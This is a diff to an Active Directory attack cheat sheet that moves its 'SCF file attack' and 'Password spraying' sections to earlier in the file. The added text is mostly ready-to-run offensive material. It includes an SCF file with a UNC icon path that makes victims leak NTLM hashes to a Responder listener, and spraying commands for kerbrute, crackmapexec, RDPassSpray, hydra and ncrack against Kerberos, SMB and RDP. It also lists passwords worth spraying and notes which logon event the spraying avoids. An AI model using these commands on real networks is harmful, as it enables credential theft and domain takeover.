@@ -6,6 +6,7 @@
 * [Most common paths to AD compromise](#most-common-paths-to-ad-compromise)
   * [MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)](#ms14-068-microsoft-kerberos-checksum-validation-vulnerability)
   * [Open Shares](#open-shares)
+  * [SCF file attack against writeable share](#scf-file-attack-against-writeable-share)
   * [GPO - Pivoting with Local Admin & Passwords in SYSVOL](#gpo---pivoting-with-local-admin--passwords-in-sysvol)
   * [Dumping AD Domain Credentials](#dumping-ad-domain-credentials-systemrootntdsntdsdit)
     * Using ndtsutil
@@ -14,6 +15,7 @@
     * Using DiskShadow
     * Using Mimikatz DCSync
     * Using Mimikatz sekurlsa
+  * [Password spraying](#password-spraying)
   * [Password in AD User comment](#password-in-ad-user-comment)
   * [Pass-the-Ticket Golden Tickets](#pass-the-ticket-golden-tickets)
   * [Pass-the-Ticket Silver Tickets](#pass-the-ticket-silver-tickets)
@@ -28,7 +30,6 @@
     * [SMB Signing Disabled and IPv6](#smb-signing-disabled-and-ipv6)
     * [Drop the MIC](#drop-the-mic)
     * [Ghost Potato](#ghost-potato)
-  * [SCF file attack against writeable share](#scf-file-attack-against-writeable-share)
   * [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
   * [Trust relationship between domains](#trust-relationship-between-domains)
   * [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
@@ -36,7 +37,6 @@
   * [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
   * [Relay delegation with mitm6](#relay-delegation-with-mitm6)
   * [PrivExchange attack](#privexchange-attack)
-  * [Password spraying](#password-spraying)
   * [Extract accounts from /etc/krb5.keytab](#extract-accounts-from-etc-krb5-keytab)
   * [PXE Boot image attack](#pxe-boot-image-attack)
   * [Impersonating Office 365 Users on Azure AD Connect](#impersonating-office-365-users-on-azure-ad-connect)
@@ -264,6 +264,18 @@ smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
 sudo mount -t cifs -o username=<user>,password=<pass> //<IP>/Users folder
 ```
 
+### SCF file attack against writeable share
+
+Drop the following `something.scf` file inside a share and start listening with Responder : `responder -wrf --lm -v -I eth0`
+
+```powershell
+[Shell]
+Command=2
+IconFile=\\10.10.XX.XX\Share\test.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
 ### GPO - Pivoting with Local Admin & Passwords in SYSVOL
 
 :triangular_flag_on_post: GPO Priorization : Organization Unit > Domain > Site > Local
@@ -435,6 +447,49 @@ Dumps credential data in an Active Directory domain when run on a Domain Control
 sekurlsa::krbtgt
 lsadump::lsa /inject /name:krbtgt
 ```
+
+
+### Password spraying
+
+Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. 
+
+> The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates. 
+
+#### Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
+
+> Kerberos pre-authentication errors are not logged in Active Directory with a normal Logon failure event (4625), but rather with specific logs to Kerberos pre-authentication failure (4771).
+
+```powershell
+root@kali:~$ ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
+root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
+root@kali:~$ python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
+```
+
+#### Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
+
+```powershell
+crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
+```
+
+#### Using [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) to target RDP services.
+
+```powershell
+python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
+```
+
+#### Using [hydra]() and [ncrack]() to target RDP services.
+
+```powershell
+hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
+ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
+```
+
+Most of the time the best passwords to spray are :
+
+- Password123
+- Welcome1
+- $Companyname1 : $Microsoft1
+- SeasonYear : Winter2019*
 
 ### Password in AD User comment
 
@@ -820,18 +875,6 @@ Using a modified version of ntlmrelayx : https://shenaniganslabs.io/files/impack
 ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
 ```
 
-### SCF file attack against writeable share
-
-Drop the following `something.scf` file inside a share and start listening with Responder : `responder -wrf --lm -v -I eth0`
-
-```powershell
-[Shell]
-Command=2
-IconFile=\\10.10.XX.XX\Share\test.ico
-[Taskbar]
-Command=ToggleDesktop
-```
-
 ### Dangerous Built-in Groups Usage
 
 If you do not want modified ACLs to be overwrite every hour, you should change ACL template on the object CN=AdminSDHolder,CN=System, " or set "adminCount" attribute to 0 for the required objec
@@ -1089,46 +1132,6 @@ python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d 
 python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip
 ```
 
-### Password spraying
-
-Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. 
-
-> The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates. 
-
-#### Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
-
-> Kerberos pre-authentication errors are not logged in Active Directory with a normal Logon failure event (4625), but rather with specific logs to Kerberos pre-authentication failure (4771).
-
-```powershell
-root@kali:~$ ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
-root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
-root@kali:~$ python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
-```
-
-#### Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
-
-```powershell
-crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
-```
-
-#### Using [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) to target RDP services.
-
-```powershell
-python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
-```
-
-#### Using [hydra]() and [ncrack]() to target RDP services.
-
-```powershell
-hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
-ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
-```
-
-Most of the time the best passwords to spray are :
-
-- Password1
-- Welcome1
-- $Companyname1
 
 ### Extract accounts from /etc/krb5.keytab
 
